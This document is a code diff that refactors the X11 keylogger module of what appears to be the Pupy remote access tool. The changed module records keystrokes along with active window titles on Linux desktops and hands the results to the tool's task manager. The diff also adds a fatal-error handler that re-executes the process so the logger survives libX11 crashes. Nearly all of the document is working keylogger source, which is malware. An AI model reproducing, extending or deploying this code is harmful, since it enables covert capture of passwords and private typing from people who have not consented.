@@ -6,9 +6,11 @@ import ctypes as ct
 from ctypes.util import find_library
 import subprocess
 import threading
+import pupy
 
 from subprocess import Popen, PIPE
 import re
+import os
 
 try:
     x11 = ct.cdll.LoadLibrary(find_library('X11'))
@@ -43,6 +45,10 @@ try:
     x11.XGetEventData.argtypes = [ ct.c_void_p, ct.c_void_p ]
     x11.XFreeEventData.argtypes = [ ct.c_void_p, ct.c_void_p ]
     x11.XQueryExtension.argtypes = [ ct.c_void_p, ct.c_char_p, ct.c_void_p, ct.c_void_p, ct.c_void_p ]
+    x11.XSetErrorHandler.restype = ct.c_int
+    x11.XSetErrorHandler.argtypes = [ ct.c_void_p ]
+    x11.XSetIOErrorHandler.restype = ct.c_int
+    x11.XSetIOErrorHandler.argtypes = [ ct.c_void_p ]
 except:
     x11 = None
 
@@ -157,13 +163,22 @@ class XIDeviceEvent(ct.Structure):
         ( "group",      XIModifierState ),
     ]
 
+class XErrorEvent(ct.Structure):
+    _fields_ = [
+        ( "type",       ct.c_int ),
+        ( "display",    ct.c_void_p ),
+        ( "serial",     ct.c_uint ),
+        ( "error_code", ct.c_char ),
+        ( "request_code", ct.c_char ),
+        ( "minor_code", ct.c_char ),
+        ( "XID",        ct.c_ulong )
+    ]
+
 def XiMaxLen():
     return (((27) >> 3) + 1)
 
 def XiSetMask(mask, event):
     mask[(event)>>3] |= (1 << ((event) & 7))
-
-KEYLOGGER_THREAD = None
 
 def keysym_to_XK(ks):
     return {
@@ -501,56 +516,49 @@ def keysym_to_unicode(ks):
     }.get(ks)
 
 def keylogger_start():
-    global KEYLOGGER_THREAD
-
-    if KEYLOGGER_THREAD and not KEYLOGGER_THREAD.stopped:
+    if pupy.manager.active(KeyLogger):
         return False
 
     try:
-        keyLogger = KeyLogger()
-    except:
+        keyLogger = pupy.manager.create(KeyLogger)
+    except Exception, e:
+        print e
         return 'no_x11'
 
-    keyLogger.start()
-
-    KEYLOGGER_THREAD = keyLogger
     return True
 
 def keylogger_dump():
-    global KEYLOGGER_THREAD
-
-    if KEYLOGGER_THREAD:
-        d = KEYLOGGER_THREAD.dump()
-        return d
+    keylogger = pupy.manager.get(KeyLogger)
+    if keylogger:
+        return keylogger.results
 
 def keylogger_stop():
-    global KEYLOGGER_THREAD
-
-    if KEYLOGGER_THREAD:
-        KEYLOGGER_THREAD.stop()
-        return True
-
-    return False
+    keylogger = pupy.manager.get(KeyLogger)
+    if keylogger:
+        pupy.manager.stop(KeyLogger)
+        return keylogger.results
 
 class NotAvailable(Exception):
     pass
 
-class KeyLogger(threading.Thread):
+class KeyLogger(pupy.Task):
+    results_type = unicode
+
     def __init__(self, *args, **kwargs):
-        threading.Thread.__init__(self, *args, **kwargs)
+        super(KeyLogger, self).__init__(*args, **kwargs)
         global x11, xi
 
         self.daemon = False
-        self.stopped = False
         self.last_window = None
         self.last_clipboard = ""
-        self.buffer = []
         self.state = set()
         self.group = 0
         self.level = 0
         self.display = None
         self.x11 = x11
         self.xi = xi
+        self._fatal_error_cb = self.fatal_error_handler
+        self._error_cb = self.error_handler
 
         XkbEventCode = ct.c_int(0)
         XkbErrorReturn = ct.c_int(0)
@@ -560,17 +568,54 @@ class KeyLogger(threading.Thread):
 
         if self.x11:
             self.display = x11.XkbOpenDisplay(
-                None,
+                os.environ.get('DISPLAY'),
                 ct.pointer(XkbEventCode), ct.pointer(XkbErrorReturn),
                 ct.pointer(XkbMajorVersion), ct.pointer(XkbMinorVersion),
                 ct.pointer(XkbReasonReturn)
             )
 
-        if not self.display:
-            self.stopped = True
+        if self.display:
+            self.x11.XSetErrorHandler(
+                ct.CFUNCTYPE(ct.c_int, ct.c_void_p, ct.c_void_p)(self._error_cb)
+            )
+            self.x11.XSetIOErrorHandler(
+                ct.CFUNCTYPE(ct.c_int, ct.c_void_p)(self._fatal_error_cb)
+            )
+        else:
+            self.stop()
             raise NotAvailable()
 
+    def _fatal_error_handler(self, error):
+        self.stop()
+        # Stupid libX11 will kill our application now, so let's try to reexec self
+        try:
+            executable = os.readlink('/proc/self/exe')
+            args = open('/proc/self/cmdline').read().split('\x00')
+        except:
+            executable = sys.executable
+            args = sys.argv
+
+        os.execv(executable, args)
+        return 0
+
+    @property
+    def fatal_error_handler(self):
+        def __handler(error):
+            return self._fatal_error_handler(error)
+
+        return __handler
+
+    @property
+    def error_handler(self):
+        def __handler(display, error):
+            self.stop()
+
+        return __handler
+
     def get_active_window(self):
+        if not self.display:
+            raise NotAvailable()
+
         window = ct.c_ulong()
         dw = ct.c_int()
 
@@ -582,6 +627,9 @@ class KeyLogger(threading.Thread):
         return window
 
     def get_window_title(self, window):
+        if not self.display:
+            raise NotAvailable()
+
         if not window:
             return
 
@@ -592,23 +640,25 @@ class KeyLogger(threading.Thread):
     def get_active_window_title(self):
         return self.get_window_title(self.get_active_window())
 
-    def append_key_buff(self, k):
+    def append(self, k):
         if k:
             window = self.get_active_window_title()
             if self.last_window != window:
                 self.last_window = window
-                self.buffer.append("\n%s: %s \n"%(time(),str(window)))
+                super(KeyLogger, self).append(
+                    '\n{}: {}\n'.format(time(),str(window))
+                )
 
-            self.buffer.append(k)
+            super(KeyLogger, self).append(k)
 
     def poll(self, callback, sleep_interval=.01):
-        while not self.stopped:
+        while self.active:
             sleep(sleep_interval)
             released, group, level = self.fetch_keys_poll()
             callback(self.to_keysyms(released, group, level))
 
     def xinput(self, callback):
-        if not self.xi:
+        if not self.xi or not self.display:
             raise NotAvailable()
 
         xi_opcode = ct.c_int()
@@ -637,7 +687,7 @@ class KeyLogger(threading.Thread):
         self.x11.XMapWindow(self.display, root_win)
         self.x11.XSync(self.display, 0)
 
-        while not self.stopped:
+        while self.active:
             event = XEvent()
             self.x11.XNextEvent(self.display, ct.pointer(event))
             self.x11.XGetEventData(self.display, ct.pointer(event.cookie))
@@ -653,21 +703,16 @@ class KeyLogger(threading.Thread):
 
         self.x11.XDestroyWindow(self.display, root_win)
 
-    def run(self):
+    def task(self):
         try:
-            self.xinput(self.append_key_buff)
+            self.xinput(self.append)
         except NotAvailable:
-            self.poll(self.append_key_buff)
-
-    def stop(self):
-        self.stopped = True
-
-    def dump(self):
-        res = u''.join(self.buffer)
-        self.buffer = []
-        return res
+            self.poll(self.append)
 
     def fetch_keys_poll(self):
+        if not self.display:
+            raise NotAvailable()
+
         state = XkbState()
         self.x11.XkbGetState(self.display, 0x0100, ct.pointer(state))
 
@@ -696,7 +741,11 @@ class KeyLogger(threading.Thread):
         return released, group, level
 
     def to_keysyms(self, released, group, level):
+        if not self.display:
+            raise NotAvailable()
+
         keys = set()
+        level = level & 1
 
         for k in set(released):
             # We incorrectly guess level here, but in 99% real life cases shift means level1
@@ -725,13 +774,4 @@ class KeyLogger(threading.Thread):
     def __del__(self):
         if self.display:
             self.x11.XCloseDisplay(self.display)
-
-if __name__=="__main__":
-    #the main is only here for testing purpose and won't be run by modules
-    now = time()
-    done = lambda: time() > now + 5
-    keyLogger = KeyLogger()
-    keyLogger.start()
-    sleep(10)
-    print keyLogger.dump()
-    keyLogger.stop()
+            self.display = None
